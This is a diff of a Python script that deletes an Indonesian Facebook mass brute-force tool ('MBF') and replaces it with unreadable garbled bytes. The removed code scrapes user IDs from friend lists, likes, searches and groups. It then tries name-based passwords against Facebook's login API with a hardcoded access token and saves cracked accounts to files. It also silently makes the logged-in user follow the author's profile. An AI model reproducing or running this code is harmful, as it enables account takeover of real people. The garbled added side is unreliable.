@@ -1,302 +1,317 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-import os,sys,re,time,json,random,requests
-from bs4 import BeautifulSoup as parser
-from concurrent.futures import ThreadPoolExecutor
-def clear():
-    os.system("clear")
-def kata(s):
-    for c in s + '\n':
-        sys.stdout.write(c)
-        sys.stdout.flush()
-        time.sleep(1./300)
-def baner():
-    time.sleep(0.1)
-    kata("""\n\t\033[90m~  ~  ~\033[92m┌∩┐\033[94m(\033[91m◣_◢\033[94m)\033[92m┌∩┐\033[90m~  ~  ~
-\t\033[00m FACEBOOK MBF NoobHackers.COM
-\t\033[90m -----------------------\033[94m\n
-===========================================\033[00m
-Creator \033[1;91m: \033[1;96mMr. Uzie\033[00m
-website \033[1;91m: \033[1;96mindoxploit.id\033[00m
-Web Officials  \033[1;91m: \033[4;92mNoobHackers.COM\033[00m
-\033[94m===========================================\033[00m""")
-def balik():
-    f=input("\033[00m\t[\033[96mEnter To Back\033[00m]")
-    if f == "":
-       os.system("python mbf.py")
-    else:
-       sys.exit("\033[1;91mexit\033[00m")
-def mbf():
-    time.sleep(0.1)
-    print("\033[00m[\033[93m1\033[00m] Login")
-    print("\033[00m[\033[93m2\033[00m] Update")
-    print("\033[00m[\033[93m3\033[00m] Group WA")
-    print("\033[00m[\033[93m4\033[00m] Exit")
-    time.sleep(0.1)
-    f=input("\n\033[90m> \033[1;93m")
-    if f == "1":
-         print("\033[1;94m===========================================\033[00m")
-         mbasic = 'https://mbasic.facebook.com{}'
-         global die,check,result, count
-         id = []
-         die = 0
-         chek = []
-         life = []
-         count = 0
-         check = 0
-         result = 0
-         def masuk():
-             try:
-                    cek = open("cookies").read()
-             except FileNotFoundError:
-                    cek = input("\033[90m> \033[00mCoookies : \033[1;92m")
-             cek = {"cookie":cek}
-             ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
-             if "mbasic_logout_button" in str(ismi):
-                     if "Apa yang Anda pikirkan sekarang" in str(ismi):
-                             with open("cookies","w") as f:
-                                     f.write(cek["cookie"])
-                     else:
-                           print("\033[90m> \033[00mChange the language, please wait\033[1;91m!!\033[00m")
-                           try:
-                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
-                           except:
-                                  pass
-                     try:
-                             ikuti = parser(requests.get(mbasic.format("/xzcoder.xzcoder"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
-                             ses.get(mbasic.format(ikuti),cookies=cek)
-                     except :
-                             pass
-                     return cek["cookie"]
-             else:
-                  exit("\033[00m[\033[91m!\033[00m]\033[00mCookies \033[1;91minvalid!!\033[00m")
-         def login(username,password,cek=False):
-             global die,check,result,count
-             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
-             params = {
-                     'access_token': b,
-                     'format': 'JSON',
-                     'sdk_version': '2',
-                     'email': username,
-                     'locale': 'en_US',
-                     'password': password,
-                     'sdk': 'ios',
-                     'generate_session_cookies': '1',
-                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
-             }
-             api = 'https://b-api.facebook.com/method/auth.login'
-             response = requests.get(api, params=params)
-             if 'EAA' in response.text:
-                 print(f"\r\033[00m[\033[1;32m✓\033[00m] \033[1;32m{username} \033[90m=> \033[1;32m{password}                       ",end="")
-                 print()
-                 result += 1
-                 if cek:
-                        life.append(username+"|"+password)
-                 else:
-                        with open('results-life.txt','a') as f:
-                                f.write(username + '|' + password + '\n')
-             elif 'www.facebook.com' in response.json()['error_msg']:
-                   print(f"\r\033[00m[\033[1;91mx\033[00m] \033[1;33m{username} \033[90m=> \033[1;33m{password}                    ",end="")
-                   print()
-                   check += 1
-                   if cek:
-                           chek.append(username+"|"+password)
-                   else:
-                           with open('results-check.txt','a') as f:
-                                f.write(username + '|' + password + '\n')
-             else:
-                   die += 1
-             for i in list('\|/-•'):
-                            print(f"\r\033[00m[\033[1;91m{i}\033[00m] Life : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcheckpoint : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;91m{str(die)}\033[90m)\033[00m",end="")
-                            time.sleep(0.2)
-         def getid(url):
-             raw = requests.get(url,cookies=kuki).content
-             getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
-             for x in getuser:
-                 if 'profile' in x[0]:
-                        id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
-                 elif 'friends' in x:
-                        continue
-                 else:
-                        id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
-                 print('\r\033[90m> \033[1;96m' + str(len(id)) + " \033[00mretrieved",end="")
-             if 'Lihat Teman Lain' in str(raw):
-                 getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
-             return id
-         def fromlikes(url):
-             try:
-                  like = requests.get(url,cookies=kuki).content
-                  love = re.findall('href="(/ufi.*?)"',str(like))[0]
-                  aws = getlike(mbasic.format(love))
-                  return aws
-             except:
-                  exit("\033[90m> \033[1;91mcant dump id\033[00m ")
-         def getlike(react):
-             like = requests.get(react,cookies=kuki).content
-             ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
-             for user in ids:
-                 if 'profile' in user[0]:
-                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
-                 else:
-                         id.append(user[1] + "|" + user[0].split('/')[1])
-                 print(f'\r\033[90m \033[1;96m{str(len(id))} \033[00mretrieved',end="")
-             if 'Lihat Selengkapnya' in str(like):
-                 getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
-             return id
-         def bysearch(option):
-             search = requests.get(option,cookies=kuki).content
-             users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
-             for user in users:
-                  if "profile" in user[0]:
-                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
-                  else:
-                         id.append(user[1] + "|" + user[0].split("?")[0])
-                  print(f"\r\033[90m> \033[1;96m{str(len(id))} \033[00mretrieved ",end="")
-             if "Lihat Hasil Selanjutnya" in str(search):
-                  bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
-             return id
-         def grubid(endpoint):
-             grab = requests.get(endpoint,cookies=kuki).content
-             users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
-             for user in users:
-                 if "profile" in user[0]:
-                         id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
-                 else:
-                         id.append(user[1] + "|" + user[0])
-                 print(f"\r\033[90m> \033[1;96m{str(len(id))} \033[00mretrieved ",end="")
-             if "Lihat Selengkapnya" in str(grab):
-                 grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
-             return id
-         if __name__ == '__main__':
-               try:
-                   ses = requests.Session()
-                   kukis = masuk()
-                   kuki = {'cookie':kukis}
-                   clear()
-                   baner()
-                   kata('\033[1;97m[\033[1;93m1\033[1;97m] \033[00mCrack Daftar Teman')
-                   kata('\033[1;97m[\033[1;93m2\033[1;97m] \033[00mCrack Dari Like Post\033[1;97m ')
-                   kata('\033[1;97m[\033[1;93m3\033[1;97m] \033[00mCrack Dari Pencarian Nama')
-                   kata('\033[1;97m[\033[1;93m4\033[1;97m] \033[00mCrack Dari Grup ')
-                   kata('\033[1;97m[\033[1;93m5\033[1;97m] \033[00mCrack Dari Teman')
-                   kata('\033[1;97m[\033[1;93m6\033[1;97m] \033[00mLihat Hasil Crack')
-                   kata('\033[94m===========================================\033[0m\n')
-                   print()
-                   tanya = input('\033[90m> \033[1;93m ')
-                   if tanya =="":
-                         exit("\033[00m[\033[91m!\033[00m] Dont be empty")
-                   elif tanya == '1':
-                         url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
-                         username = getid(mbasic.format(url["href"]))
-                   elif tanya == '2':
-                         username = input("\033[90m> \033[00mURL Post : \033[1;92m")
-                         if username == "":
-                                 exit("\033[00m[\033[91m!\033[00m] Dont be empty")
-                         elif 'www.facebook' in username:
-                                 username = username.replace('www.facebook','mbasic.facebook')
-                         elif 'm.facebook.com' in username:
-                                 username = username.replace('m.facebook.com','mbasic.facebook.com')
-                         username = fromlikes(username)
-                   elif tanya == '3':
-                         knf = input("\033[90m> \033[00mquery : \033[1;92m")
-                         username = bysearch(mbasic.format('/search/people/?q='+knf))
-                         if len(username) == 0:
-                                 exit("\033[90m[\033[91m!\033[00m] no result")
-                   elif tanya == '4':
-                         print("\033[90m> \033[00mcan only take \033[91m100 \033[00mIDs ")
-                         grab = input("\033[90m> \033[00mID group : \033[1;92m")
-                         username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
-                         if len(username) == 0:
-                                 exit("\033[00m[\033[91m!\033[00m]ID wrong")
-                   elif tanya == '5':
-                         knf = input("\033[90m> \033[00mUsername/Id : \033[1;92m")
-                         if knf.isdigit():
-                                 user = "/profile.php?id=" + knf
-                         else:
-                                 user = "/" + knf
-                         try:
-                                 user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
-                                 username = getid(mbasic.format(user))
-                         except TypeError:
-                                 exit("\033[00m[\033[91m!\033[00m] User Not Found ")
-                   elif tanya == '6':
-                         try:
-                                 file1 = open("results-check.txt").read()
-                                 file2 = open("results-life.txt").read()
-                                 a = file1 + file2
-                                 final = a.strip().split("\n")
-                                 final = set(final)
-                                 print(f"\033[00m [\033[1;93m{str(len(final))}\033[00m] accounts to check ")
-                                 with ThreadPoolExecutor(max_workers=10) as ex:
-                                         for user in final:
-                                                 a = user.split("|")
-                                                 ex.submit(login,(a[0]),(a[1]),(True))
-                                 os.remove("results-check.txt")
-                                 os.remove("results-life.txt")
-                                 for x in life:
-                                         with open('results-life.txt','a') as f:
-                                                 f.write(x+'\n')
-                                 for x in chek:
-                                         with open('results-check.txt','a') as f:
-                                                 f.write(x+"\n")
+þë+ý¸§ýéï§+a¢}
+ûç(v)àº×þóï
+jh®Ú,³++zØ¦z;(¶§v«z«²Û
+~º&nÎ"+´ºØºT¨º¬¥ªìz
+~º&rÜººÞ×î¶êÞ²)©¢»S·tú(L^rëh
+uçÜæ«
+¢Ë2²×¦rW
+uçäjÖ¬
+~Ü{>
+³+,µÚ.·
+âµç
+³+,µÚ.µùn²
+¶)²W§_÷Ó
+uçÛjw«
+¶)²W§M
+«ZÝ7ßÝ&Ó}ýÚm7ßÞ&Ó}ýÖoôßxM÷÷i´ßt
+·M÷ÓI�!8âSh¡±ÚrG«°#
+·M÷÷I¾ûï¾ûï¾ûï¾ûï¾ûï¾ûí7ßÞ&
+Ó}ôÒ
 
-                                 print("\n\033[00m[\033[92m✓\033[00m] Done")
-                                 print("\033[90m> \033[00msaved to \033[1;93mresults-check.txt\033[90m|\033[1;92mresults-life.txt")
-                         except FileNotFoundError:
-                                 exit("\033[00m[\033[91m!\033[00m] you not have a results")
-                   else:
-                         exit("\033[00m[\033[91m!\033[00m] wrong choice")
-                   print()
-                   expass = input("\033[90m> \033[00mExtra Password: \033[1;92m")
-                   with ThreadPoolExecutor(max_workers=30) as ex:
-                          for user in username:
-                                  users = user.split('|')
-                                  ss = users[0].split(' ')
-                                  for x in ss:
-                                          listpass = [
-                                                  str(x) + '123',
-                                                  str(x) + '12345',
-                                                  str(x) + '123456',
-                                                  str(x) + '12',
-                                                  ]
-                                          listpass.append(expass)
-                                          for passw in set(listpass):
-                                                  ex.submit(login,(users[1]),(passw))
-                   if check != 0 or result != 0:
-                           time.sleep(0.1)
-                           print("\033[1;94m===========================================\033[00m")
-                           print("\n\033[00m[\033[92m✓\033[00m] Done")
-                           print("\033[00m[\033[92m✓\033[00m]life : \033[92mresults-life.txt\033[00m")
-                           print("\033[00m[\033[91m!\033[00m]checkpoint : \033[93mresults-check.txt\033[00m")
-                           print("\n\n")
-                   
-                   else:
-                           time.sleep(0.1)
-                           print("\033[94m===========================================\033[00m")
-                           print("\n\033[00m[\033[92m✓\033[00m] Done")
-                           print("\033[00m[\033[91m!\033[00m] no result")
-               except (KeyboardInterrupt,EOFError):
-                       exit()
-               except requests.exceptions.ConnectionError:
-                       exit("\033[00m[\033[91m!\033[00m] Connection error")
+·¶ôß}}Öm7ß_zÊÔÎ'´ß}4
+Áæì×´ß}}Öm7ß_z)Ý£e¢+bwM÷ÓI
+YæÎ}ø©lÓ}õ÷Y´ß~=Úch¡±ÚrG«°#Ó}ôÒ
+Ó}ýâm7ßM&
+uçÛjX¤
+~)éºÝ7ßM&·M÷÷©×«NZrM7ßM&
+÷
+¢Ë2²×¦§+a¢y~
+z[
+³+Æ+tß}}Ög±Ý7ßM&
+uçæm
+¶)²W§M
+¦¸§·M÷ÓI´ßw]7ßM&."
+¦¸§·M÷ÓI´ßwm7ßM&RZµ
+¦¸§·M÷ÓI´ßw}7ßM&º.¥`
+¦¸§·M÷ÓI´ßw7ßM&­
+¶)²W§M
+~)éºÙôßtM÷×Ýæ
+÷õ
+¦¸§·M÷×Þ&Ó}ôÒ
+¶¬Èm¶?þfÚ²'iÇ¢¢
+ZjWbyÈ^rJÞ²émr§
+
+v'´
+r¤
+'Þ
+r§·
+r
+­ë.Ý
+uçæjË¤
+¶¼
+qé(¥éÜ¢"zÊÞi
+{¦Ñbãh´Z.Ñ+®
+qé"­Ó}ýÒm7ßM&
+('¬Ó}õ÷i
+qé¢"yÇ¤
+É¢±ë zÙjÈ~æjßæz÷«üj[r$ëzG(×§
+ùjÈþZ ¢ënëm¢x§²Úâ²h
+ð)k&§	Ýj¤¹Ç¤j¶§)ì¶¸¬
+Â+a¢§r$ë0jÇ
+
+âµçÊ('
+z[
+¦¸§·M÷÷I´ß}4(Z­éZêey«Á¨­Ó}õ÷Y´ß}4
+¶¼
+­ê®zËlëfm«"qú+«ij»®+&f«±êßwZ²Úâ�Z«"whë"jÞ}Ê('¬qé
+{¦
+¥«,
+¶¼
+K­«±êëz«²Û zÙjÈ~æjßñÍÊz¼sr^­Ê('¬qé¢{^ØmZZ®Ç«~)ÝjËkxëb·
+±ë zÙjÈ~æjØ¤ºØ¢"zÇ
+{¦
+¥«,
+­ën®wÊ('
+z[
+{­Ó}ôÒm7ßÝfÓ}ôÒm7ßM&
+$ë4ß}}Öh§½©bwM÷ÓI
+uçå¢§ºÇ«©¥«,ÂÝqéj[
+ZjWbyÈ^rJÞ²émr§
+o~tëÎyß^öó°ºÙÿ{×ûá½vÎ×mÜsmøß¶¸k}
+¥ªÚ
+iÇ²Ïí¢G§
+~æjÒR8
+±Ù?½êìö
+zf¢ë®v¦
+ç§ýD
+¥«,ÂÝ¥«,ÂÝ
+±Ù"¢
+éÞ­«^þÇ¬²*'ýÊ('¬
+²(7yß_o­_qÞÚkG8áþ|¶yþ
 
-    elif f == "2":
-         os.system("git pull")
-         balik()
+j¡¶ÚlÿöþjiÇ¢¢oæzØhwö®¶h)
+­ë)¢{­ê®zËlëZ¦*Z­©¬¥ªÚ
+ñ�)ëzÊhÇ­{
+¦¸§µúôß}4M÷×}¦Ó}ôÒm7ß]öë®v¦{M÷÷I´ß}wÚjZ²Ì(­×§
+¦¸§
+­ë.ßµ
+÷
+'Þj^Û¬z¹Úï¾¥«,ÂÝ
+z[
+Â+a¢§­ë.Û>'Þ·ZjÇ
+
+âµë¬z¹Úï¾¥«,ÂÝú
+zXÃiÇ¢¢h§­ë)¢{Ê'zºè¯ù¬
+¦¸§µúôß}4M÷×ÝfÇM÷ÓI´ß}wÞk¬z¹Úí7ßÝ&Ó}õßy©jË0¢·^
+¦¸§
+rí
+÷
+r¤j^Û¬z¹Úï¾¥«,ÂÝ
+z[
+Â+a¢§­ë.Û>rÜmi«
+
+âµë¬z¹Úï¾¥«,ÂÝú
+z[
+v'¾
+~âyb²ßþ
+¦¸§µúôß}4M÷×ÝfM÷ÓI÷´ßtM÷×Ý¦²ÚëzË¥·M÷÷I´ß}4È^rJh{tßtM÷×Ýæ²ÚÜç$Ó}ýÒm7ßM&v'´ßtM÷×Ýf²ÚÝí7ßÝ&Ó}ôÒg§
+¶)²W§M
+uçàzØº¹
+­¬+z«²Û zÛ«Ê('¬é"ríz{
+ën±êëyø§u©e']æ«,·ý«-®¶°
+~ñx¶ë
+úk¡ø¥z)ñ
+Ö©¥éÝÇ_¾­çâÖ¥Û-¯4
+zX~¸Û"
+rí{
+z[
+Ö©¥éÝÇ_¾ÇK)+ÖÊeÝ
+¦¸§¶½7ßÝ&Ó}õ÷©¾²ÚåzxûM÷ÓI«zÚâz÷zw
+òâ«Szf§-¨§{-®¶°
+ëbvfÚ²'¢¹¶«±êëkmZZ®Ç«~)ÝjËkx­Mé¶¢Þ
+­ën®x
+uçß®¥G¬º¹
+¶¼
+)­ê®zËlën®W(¢H²K¤Ê'µéí
+Þ­çâÖ¥ÞûËk)
+k zÙbéjÈ~æjÙh½
+­ën®v°
+{¦
+{­Ó}ýÒm7ß_uÆ§µÛ¦¦'tß}4
+uçàzÙbêÞiË
+)­ê®zËlëky§-r$ë$ºH¢{^
+Û+yø§u©erV¬±¶¡­çÿkøw²ÚåG
+~î±êâ'l
+úk¡ø¥z)î±êô
+Ö©¥éÝºÇ«×ï«yø§u©evËkºÇ«Ó
+z[
+Ö©¥éÝºÇ«×ï®±êô²b·ý
+¦¸§µúôßtM÷×Þ¦²ÚåzxÓ}ôÒjÞ¶¸½ç^
+òâ«RzW§F©&¢Ëk)
+ëeG¦m«"qú+«ij»®X¤zf«±êßwZ²Úââ«RzW§F©&¡­ç
+­ën®x
+uçÛÊÇ­Èh¦Ø¨
+±æ«rÞªç¬¶È¶mÜ¢"zÉ.'(×§
+ºÇ«²·wZW%jË1r¡­çÿv+Ü«,r?Ýû-®Ç­È
+~î±êâë®
+úk¡ø¥z)î±êô
+Ö©¥éÝºÇ«×ï«yø§u©evËkºÇ«Ó
+z[
+Ö©¥éÝºÇ«×ï®±êô²b·
+¦¸§µúôßtM÷×Þ¦²ÚåzxÓ}ôÒjÞ¶¸½ç^
+òâ«GjÈ¥IéZ;­&¢Ëk±æ«r
+o+j·!¥ªìz»j·!Ù¥¥ªìz·âÖ¬¶¸§¸¡jÑÚ²)RzV§ëgÉ¨ky
+­ën®x
+uçà®æâuéÝ¦§
+¶­ê®zËlë^Úh{\¢"zÉ.'(×§
+ºÇ«²·wZV«,·ÿö¬¶¸+i
+~î±êâë®
+úk¡ø¥z)î±êô
+Ö©¥éÝºÇ«×ï«yø§u©e×l¶»¬z½4
+z[
+Ö©¥éÝºÇ«×ï®±êô
+¦¸§µúôßtM÷×Þ¦²ÚåzxÓ}ôÒjÞ¶¸½ç^
+òâ«RzW§F©&¢Ëk¶
+»ÙjÈ~æjÚZ®Ç«¶Ù¥¥ªìz·âÖ¬¶¸§¸¡jÔéàªgÉ¨ky
+­ën®x
+ÿÿ©ÿÿÿ¨§ÿ
+¶¼
+±ë+z«²ÛzË"¢
+é"²f¬º
+é"r$é.+
+rW
+m©Þ
+«ZÓ}õ÷¹´ß}}Þmtß}}îm7ßM&
+¶6µªÓzf§
+«ZÓ}õ÷¹´ß}}Þm´ß}}îm7ßM&
+¶6«¸¤xú,·M÷×Þæ
+«ZÓ}õ÷¹´ß}}Þmôß}}îm7ßM&
+¶6«÷§qªâjsZ
+«ZÓ}õ÷¹´ß}}Þn4ß}}îm7ßM&
+¶6«jî
+«ZÓ}õ÷¹´ß}}Þntß}}îm7ßM&
+¶6«7¦j
+«ZÓ}õ÷¹´ß}}Þn´ß}}îm7ßM&.(Z´v¬P«iÉ
+«ZÓ}ýâm7ßI§
+¦¸§
+µ©òj)éºÝ7ßÝ&Ó}õ÷y
+ûZ&
+{­Ó}ôÒm7ßÝfÓ}ôÒ`èÖÞzjm
+zXµ©òk
+º¹ij»®Ç¬ëfm«"qú+«ç(¢H²K¤Ê'µéíÙ¥¥ªìz·âÖ¬¶¸§7¦j
+ºÇ«©ëbvfÚ²'¢¹¶êå·
+zXµ©òk
+ºÇ«©zn·M÷÷I´ß}4DK>-Ó}õ÷i
+û¬z¹Ú
+{­Ó}ôÒm7ßÝfÓ}ôÒ`èÖÞzjm
+zXÃiÇ¢"ë®v¦
+ºÇ«©ºÇ«©­êeiÇ°ÃÚqæè¢IjÈ}§n$
+zXöyº(Ê&{¬z¹Ú
+ºÇ«©ºÇ«©­êeiÇ¦}§n$r¦m«"qöyº(Ê&
+ºÇ«©~º&)²ë®v¦
+zXµ©òk
+wâ­Ó}ýÒm7ßM&ªç«ËM÷×Ý¦
+ºÇ«©o+j·!¶¬Çè®f­þÇ­È¥ê)ïêúIß
+ù^ë®v¦{
+{­Ó}ýÒm7ßÝfÓ}ôÒiè­ë.
+zXµ©òk
+¦¸§·M÷÷I´ß}4Æ§¢yrµ©Ó}ýÖmtÓM÷ÓI
+¶zn·M÷÷I´ß}4à®©Ó}õ÷i
+ºÇ«©»ÙjÈ~æjßÛ®,{ø+¢êéz»?ß ­¦
+ù^ë®v¦{
+{­Ó}ôÒm7ßÝfÓ}ôÒbÂº'
+zXµ©òk
+wâ­Ó}ýÒm7ßM&RÇ«©ütß}}Ú
+ù'~+­
+ºÇ«þè~)^¦bwé'
+z[
+ºÇ«ÿé'
+¶¼
+ºÇ«¥ªìzºÞªç¬¶È¶fÚ²'¢¹¶ë­Ê('¬é"ríz{a¶iij»­ø§u«-®)àMéÞ
+ºÇ«©ëbvfÚ²'¢¹¶ë
+{¦Ôò¥á+®
+{­Ó}ôÒm7ßÝfÓ}ôÒe,z³h´Z.
+zXµ©òk
+¶¼
+~)^Ö^·¬º[lùÈ^rKq¶·
+~)^Ú^·¬º[lúXzÜm­æ
+iø¥{_W¶
+~)Ú«-®*l¦X­
+~)ÚÇ­~)Ú
+¦¸§µý7ßM&Ó}õ÷y¬¶¹^ø§j]7ßM&iÇ(º{l¶!yÉ
+Â+aNÞiÓè¢Q1yË­¢¹Çü(®G«³]±ì
+~î±êâø§j
+jë®Êe
+{.nh­"­Õ:î
+¢ÊÞÞ­ë.Û>rÜm
+¢ÊÞÞ­ë.Û>'Þ·
+~ñyb}
+Â+a¢§­ë.Û>'Þ·ZjÇ
+
+âµì~
+~ñw!z
+Â+a¢§­ë.Û>rÜmi«
+
+âµì~
 
-    elif f == "3":
-         os.system("xdg-open https://chat.whatsapp.com/L7eHXMLPk0H6tysaSZEAMj")
-         balik()
+¦¸§¶}7ßM&Ó}ýÚm7ßM&Þ
+¦¸§·M÷÷I´ß}4Æ¯yÛhÓ}õ÷y«zË¥¶Ïç$·tßtM÷×Ý¦­ë.Û>'Þ·
+{¦Ñbãh´Z.Ñ+®
+{­Ó}ôÒm7ßÝfÓ}ôÒl¨ºz-«Þj·¬º[l
+z[
+{­Ó}ôÒm7ßÝfÓ}ôÒl+¢x
+¦¸§
+{Z²È§¦ëtßtM÷ÓIÆÚÚ=«,ÂÝÓ}õ÷i
+Â+aNÞiÓè¢Q1yË­¢¹Çü(®G«³}±ì
+~î±êâë®v¦
+ºÇ«²ë®Êe
+²Ë¬z»4²b
+~ñ{,
++-¥«,
+²Úñû]·
+²Úñû]·ã
+²Úñû]·ã
+²Úñû]
 
-    elif f == "4":
-         sys.exit("\033[00m[\033[91m!\033[00m]\033[91mexit\033[00m")
++-¥«,j^×±¥«,
+~éjË0{¶X¬¶¬
+{.nh­"ë®ÍijË0
+÷!yÉ4¢ºÞ²ém
+¶)²W§M
+¦¸§·M÷×Þ&Ó}ôÒ
+¦¸§¶}7ßM&Ó}ýÚm7ßM&Þ
+¦¸§·M÷ÓI´ßvM÷ÓI¥÷´ßv·¬º[lúXzÜmÓ}ôÒ
+¦¸§·M÷ÓI´ßuM÷ÓIç$¦§·M÷÷y«zË¥¶Ïç$·tß}4
+¦¸§¶y
 
-    else:
-         balik()  
+z[
+¶)²W§M
+¦¸§·M÷÷´ß}4
+¦¸§¶}7ßM&Ó}ýÚm7ßM&Þ
+¦¸§·M÷ÓI´ßuM÷ÓI§¢·¬º[
+{¦ÒÉº­Ò'µêëºD8Q+®
+{­
+{¦ÚÞªç¬¶Ç±qêmì
+çyËb¢q+®
+{­Ó}ôÒm7ßÝfÓ}ôÒ`¨w¶*'zºè
+
+zX
+¢Ë2²×¦+iºY
+m©b
+
+zX
+¢Ë2²×¦ÅØ>¢§Ûi³ÿÜ«p«lj\¢oËíá×0³äÐ~­ÊÆd@
+m©b
+
+zX
+³+Æ+tß}4M÷÷Y´ß}4M÷÷YÆ+tß}4
+
+z[
+m©b
 
 
-if __name__=="__main__":
-     clear()
-     baner()
-     mbf()
-     balik()
+ÿÿ©ÿÿÿ¨§ÿ
+rW
+m©Þ
+·
+m©b
